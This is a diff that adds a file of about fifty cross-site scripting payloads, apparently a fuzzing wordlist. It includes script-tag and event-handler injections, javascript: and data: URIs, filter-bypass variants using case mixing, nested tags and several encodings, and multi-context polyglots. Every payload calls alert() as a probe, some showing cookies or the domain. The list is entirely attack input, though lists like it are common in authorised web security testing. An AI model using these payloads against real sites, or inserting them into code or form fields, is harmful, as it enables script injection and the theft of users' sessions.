@@ -1,0 +1,50 @@
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video src=x onerror=alert(1)>
+<div onmouseover="alert(1)">hover me</div>
+<div onmouseenter="alert(1)">hover me</div>
+<a href="#" onclick="alert(1)">click</a>
+<input onblur=alert(1) autofocus><input autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<audio src onloadstart=alert(1)>
+<form onsubmit=alert(1)><input type=submit>
+<object data="javascript:alert(1)">
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<script>alert`1`</script>
+<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
+<img src=x onerror=\u0061lert(1)>
+<img/src=x onerror=alert(1)>
+<img src=x onerror=alert(1)//>
+<svg/onload=alert(1)>
+"><img src=x onerror=alert(1)>
+'-alert(1)-'
+</script><script>alert(1)</script>
+<a href="javascript:void(0)" onmouseover=alert(1)>x</a>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+"><svg/onload=alert(1)>//
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+#<img src=x onerror=alert(1)>
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+window.name='<script>alert(1)</script>'
+document.location="javascript:alert(1)"
+%3Cscript%3Ealert(1)%3C/script%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+&#60;script&#62;alert(1)&#60;/script&#62;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<script>eval(atob("YWxlcnQoMSk="))</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
